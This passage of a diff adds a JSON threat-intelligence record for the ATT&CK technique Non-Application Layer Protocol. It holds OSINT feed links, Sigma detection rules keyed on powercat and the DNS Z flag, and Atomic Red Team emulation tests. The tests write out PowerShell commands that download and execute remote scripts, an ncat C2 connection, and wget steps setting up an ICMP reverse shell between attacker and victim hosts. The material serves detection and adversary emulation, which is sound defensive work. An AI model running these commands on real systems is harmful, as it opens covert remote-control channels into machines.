Traffic Content', 'Network Traffic: Network Traffic Flow'], 'x_mitre_is_subtechnique': False}",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4",
+                        "lookup_data": {
+                            "description": "FontOnLake: Previously unknown malware family targeting Linux",
+                            "link": "http://www.botvrij.eu/data/feed-osint/5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4.json",
+                            "misp:feed": "http://www.botvrij.eu/data/feed-osint",
+                            "timestamp": "1633682506",
+                            "uuid": "5f17a0c6-7b04-4f05-9fda-b5d435a8d6a4",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "c5b20776-639a-49bf-94c7-84f912b91c15",
+                        "lookup_data": {
+                            "description": "Adversaries may use a non-application layer protocol for communication between host and C2 server or among infected hosts within a network",
+                            "raw": "author: frack113\ndate: 2021/07/21\ndescription: Adversaries may use a non-application layer protocol for communication\n  between host and C2 server or among infected hosts within a network\ndetection:\n  condition: selection\n  selection:\n    HostApplication|contains:\n    - 'powercat '\n    - powercat.ps1\nfalsepositives:\n- Unknown\nid: c5b20776-639a-49bf-94c7-84f912b91c15\nlevel: medium\nlogsource:\n  category: ps_classic_start\n  definition: fields have to be extract from event\n  product: windows\nmodified: 2022/12/25\nreferences:\n- https://nmap.org/ncat/\n- https://github.com/besimorhino/powercat\n- https://github.com/redcanaryco/atomic-red-team/blob/f339e7da7d05f6057fdfcdd3742bfcf365fee2a9/atomics/T1095/T1095.md\nrelated:\n- id: bf7286e7-c0be-460b-a7e8-5b2e07ecc2f2\n  type: derived\nstatus: test\ntags:\n- attack.command_and_control\n- attack.t1095\ntitle: Netcat The Powershell Version\n",
+                            "sigma:id": "c5b20776-639a-49bf-94c7-84f912b91c15",
+                            "title": "Netcat The Powershell Version",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "ede05abc-2c9e-4624-9944-9ff17fdc0bf5",
+                        "lookup_data": {
+                            "description": "The DNS Z flag is bit within the DNS protocol header that is, per the IETF design, meant to be used reserved (unused).\nAlthough recently it has been used in DNSSec, the value being set to anything other than 0 should be rare.\nOtherwise if it is set to non 0 and DNSSec is being used, then excluding the legitimate domains is low effort and high reward.\nDetermine if multiple of these files were accessed in a short period of time to further enhance the possibility of seeing if this was a one off or the possibility of larger sensitive file gathering.\nThis Sigma query is designed to accompany the Corelight Threat Hunting Guide, which can be found here: https://www3.corelight.com/corelights-introductory-guide-to-threat-hunting-with-zeek-bro-logs'\n",
+                            "raw": "author: '@neu5ron, SOC Prime Team, Corelight'\ndate: 2021/05/04\ndescription: 'The DNS Z flag is bit within the DNS protocol header that is, per the\n  IETF design, meant to be used reserved (unused).\n\n  Although recently it has been used in DNSSec, the value being set to anything other\n  than 0 should be rare.\n\n  Otherwise if it is set to non 0 and DNSSec is being used, then excluding the legitimate\n  domains is low effort and high reward.\n\n  Determine if multiple of these files were accessed in a short period of time to\n  further enhance the possibility of seeing if this was a one off or the possibility\n  of larger sensitive file gathering.\n\n  This Sigma query is designed to accompany the Corelight Threat Hunting Guide, which\n  can be found here: https://www3.corelight.com/corelights-introductory-guide-to-threat-hunting-with-zeek-bro-logs''\n\n  '\ndetection:\n  condition: not z_flag_unset and most_probable_valid_domain and not (exclude_tlds\n    or exclude_query_types or exclude_responses or exclude_netbios)\n  exclude_netbios:\n    id.resp_p:\n    - 137\n    - 138\n    - 139\n  exclude_query_types:\n    qtype_name:\n    - ns\n    - mx\n  exclude_responses:\n    answers|endswith: \\\\x00\n  exclude_tlds:\n    query|endswith:\n    - .arpa\n    - .local\n    - .ultradns.net\n    - .twtrdns.net\n    - .azuredns-prd.info\n    - .azure-dns.com\n    - .azuredns-ff.info\n    - .azuredns-ff.org\n    - .azuregov-dns.org\n  most_probable_valid_domain:\n    query|contains: .\n  z_flag_unset:\n    Z: 0\nfalsepositives:\n- Internal or legitimate external domains using DNSSec. Verify if these are legitimate\n  DNSSec domains and then exclude them.\n- If you work in a Public Sector then it may be good to exclude things like endswith\n  \".edu\", \".gov\" and or \".mil\"\nfields:\n- ts\n- id.orig_h\n- id.orig_p\n- id.resp_h\n- id.resp_p\n- proto\n- qtype_name\n- qtype\n- query\n- answers\n- rcode\n- rcode_name\n- trans_id\n- qtype\n- ttl\n- AA\n- uid\nid: ede05abc-2c9e-4624-9944-9ff17fdc0bf5\nlevel: medium\nlogsource:\n  product: zeek\n  service: dns\nmodified: 2022/11/29\nreferences:\n- https://twitter.com/neu5ron/status/1346245602502443009\n- https://tdm.socprime.com/tdm/info/eLbyj4JjI15v#sigma\n- https://tools.ietf.org/html/rfc2929#section-2.1\n- https://www.netresec.com/?page=Blog&month=2021-01&post=Finding-Targeted-SUNBURST-Victims-with-pDNS\nstatus: experimental\ntags:\n- attack.t1095\n- attack.t1571\n- attack.command_and_control\ntitle: Suspicious DNS Z Flag Bit Set\n",
+                            "sigma:id": "ede05abc-2c9e-4624-9944-9ff17fdc0bf5",
+                            "title": "Suspicious DNS Z Flag Bit Set",
+                            "_cycat_type": "Item"
+                        }
+                    },
+                    {
+                        "uuid": "5df8df26-fe0e-4858-94a7-6cf71d9519c9",
+                        "lookup_data": {
+                            "description": "UEFI threats moving to the ESP: Introducing ESPecter bootkit",
+                            "link": "https://www.circl.lu/doc/misp/feed-osint/5df8df26-fe0e-4858-94a7-6cf71d9519c9.json",
+                            "misp:feed": "https://www.circl.lu/doc/misp/feed-osint",
+                            "timestamp": "1637336858",
+                            "uuid": "5df8df26-fe0e-4858-94a7-6cf71d9519c9",
+                            "_cycat_type": "Item"
+                        }
+                    }
+                ]
+            }
+        },
+        "atomics": [
+            {
+                "attack_technique": "T1095",
+                "display_name": "Non-Application Layer Protocol",
+                "atomic_tests": [
+                    {
+                        "name": "ICMP C2",
+                        "auto_generated_guid": "0268e63c-e244-42db-bef7-72a9e59fc1fc",
+                        "description": "This will attempt to  start C2 Session Using ICMP. For information on how to set up the listener\nrefer to the following blog: https://www.blackhillsinfosec.com/how-to-c2-over-icmp/\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "server_ip": {
+                                "description": "The IP address of the listening server",
+                                "type": "string",
+                                "default": "127.0.0.1"
+                            }
+                        },
+                        "executor": {
+                            "command": "IEX (New-Object System.Net.WebClient).Downloadstring('https://raw.githubusercontent.com/samratashok/nishang/c75da7f91fcc356f846e09eab0cfd7f296ebf746/Shells/Invoke-PowerShellIcmp.ps1')\nInvoke-PowerShellIcmp -IPAddress #{server_ip}\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Netcat C2",
+                        "auto_generated_guid": "bcf0d1c1-3f6a-4847-b1c9-7ed4ea321f37",
+                        "description": "Start C2 Session Using Ncat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "server_port": {
+                                "description": "The port for the C2 connection",
+                                "type": "integer",
+                                "default": 80
+                            },
+                            "ncat_exe": {
+                                "description": "The location of ncat.exe",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1095\\nmap-7.80\\ncat.exe"
+                            },
+                            "ncat_path": {
+                                "description": "The folder path of ncat.exe",
+                                "type": "path",
+                                "default": "PathToAtomicsFolder\\..\\ExternalPayloads\\T1095"
+                            },
+                            "server_ip": {
+                                "description": "The IP address or domain name of the listening server",
+                                "type": "string",
+                                "default": "127.0.0.1"
+                            }
+                        },
+                        "dependency_executor_name": "powershell",
+                        "dependencies": [
+                            {
+                                "description": "ncat.exe must be available at specified location (#{ncat_exe})\n",
+                                "prereq_command": "if( Test-Path \"#{ncat_exe}\") {exit 0} else {exit 1}\n",
+                                "get_prereq_command": "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12\nNew-Item -ItemType Directory -Force -Path \"#{ncat_path}\" | Out-Null\n$parentpath = Split-Path (Split-Path \"#{ncat_exe}\"); $zippath = \"$parentpath\\nmap.zip\"\nInvoke-WebRequest  \"https://nmap.org/dist/nmap-7.80-win32.zip\" -OutFile \"$zippath\"\n  Expand-Archive $zippath $parentpath -Force\n  $unzipPath = Join-Path $parentPath \"nmap-7.80\"\nif( $null -eq (Get-ItemProperty HKLM:\\Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\* | ?{$_.DisplayName -like \"Microsoft Visual C++*\"}) ) {\n  Start-Process (Join-Path $unzipPath \"vcredist_x86.exe\")\n}\n"
+                            }
+                        ],
+                        "executor": {
+                            "command": "cmd /c \"#{ncat_exe}\" #{server_ip} #{server_port}\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Powercat C2",
+                        "auto_generated_guid": "3e0e0e7f-6aa2-4a61-b61d-526c2cc9330e",
+                        "description": "Start C2 Session Using Powercat\nTo start the listener on a Linux device, type the following: \nnc -l -p <port>\n",
+                        "supported_platforms": [
+                            "windows"
+                        ],
+                        "input_arguments": {
+                            "server_ip": {
+                                "description": "The IP address or domain name of the listening server",
+                                "type": "string",
+                                "default": "127.0.0.1"
+                            },
+                            "server_port": {
+                                "description": "The port for the C2 connection",
+                                "type": "integer",
+                                "default": 80
+                            }
+                        },
+                        "executor": {
+                            "command": "IEX (New-Object System.Net.Webclient).Downloadstring('https://raw.githubusercontent.com/besimorhino/powercat/ff755efeb2abc3f02fa0640cd01b87c4a59d6bb5/powercat.ps1')\npowercat -c #{server_ip} -p #{server_port}\n",
+                            "name": "powershell"
+                        }
+                    },
+                    {
+                        "name": "Linux ICMP Reverse Shell using icmp-cnc",
+                        "auto_generated_guid": "8e139e1f-1f3a-4be7-901d-afae9738c064",
+                        "description": "ICMP C2 (Command and Control) utilizes the Internet Control Message Protocol (ICMP), traditionally used for network diagnostics, as a covert communication channel for attackers. By using ICMP, adversaries can send commands, exfiltrate data, or maintain access to compromised systems without triggering network detection systems.\nThis method allows attackers to communicate and control compromised devices while remaining undetected.\n\nFor more details, check this blog: [ICMP Reverse Shell Blog](https://cryptsus.com/blog/icmp-reverse-shell.html)\n\n**Important Notes:**\n- Use `[icmp-cnc]` for the C2 server (Attacker) and `[icmpdoor]` for the C2 client (Victim).\n- Binaries work on Ubuntu 22.04.5 LTS; for CentOS Stream or other, use the Python file from the GitHub link [https://github.com/krabelize/icmpdoor].\n- Root access is required.\n",
+                        "supported_platforms": [
+                            "linux"
+                        ],
+                        "executor": {
+                            "steps": "1. Run the following command on both the attacker and victim machines to download the required binaries.\n\n    mkdir -p /tmp/icmpdoor && wget -P /tmp/icmpdoor https://github.com/krabelize/icmpdoor/raw/2398f7e0b8548d8ef2891089e4199ee630e84ef6/binaries/x86_64-linux/icmp-cnc https://github.com/krabelize/icmpdoor/raw/2398f7e0b8548d8ef2891089e4199ee630e84ef6/binaries/x86_64-linux/icmpdoor && chmod +x /tmp/icmpdoor/icmp-cnc /tmp/icmpdoor/icmpdoor && echo 'export PATH=$PATH:/tmp/icmpdoor' >> ~/.bashrc && source ~/.bashrc\n\n2. Start the C2 server on the attacker system to listen for incoming connections.\n\n    icmp-cnc --interface <Network Interface> --destination_ip <VICTIM-IP>\n\n3. Run the client on the victim machine.\n\n    icmpdoor --interface <Network Interface> --destination_ip <ATTACKER-IP>\n  \n4. Cleanup Command: Remove the icmpdoor directory.\n\n    rm -rf /tmp/icmpdoor\n",
+                            "name": "manual"
+                        }
+                    }
+                ]
+            }
+        ]
+    },
+    "timestamp": "2025-02-28 12:48:51"
+}
